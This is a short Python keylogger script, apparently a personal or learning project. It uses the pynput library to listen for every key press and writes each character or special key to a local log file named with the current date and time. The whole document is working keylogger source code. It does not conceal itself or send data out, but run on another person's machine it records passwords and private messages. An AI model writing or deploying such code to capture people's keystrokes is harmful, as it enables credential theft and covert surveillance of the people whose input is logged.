from pynput import keyboard 
from datetime import datetime


# curr date n time 
current_time = datetime.now().strftime("%Y-%m-%d_%H_%M_%S") 

#constructs file based on curr date n time 
key_logger_file = f"log_{current_time}.txt"

# function called for every key pressed 
def key_types(key): 
    try: 
        with open(key_logger_file, "a") as log_file: # open allows writing keysteoke without erasing data 
            log_file.write(f"{key.char}") 
    # for pressed like ctrl alt delete 
    except AttributeError: 
        with open(key_logger_file, "a") as log_file: 
            log_file.write(f"[{key}]") 

# starting listener 
with keyboard.Listener(on_press=key_types) as listener: 
    listener.join() # keeps programs running 
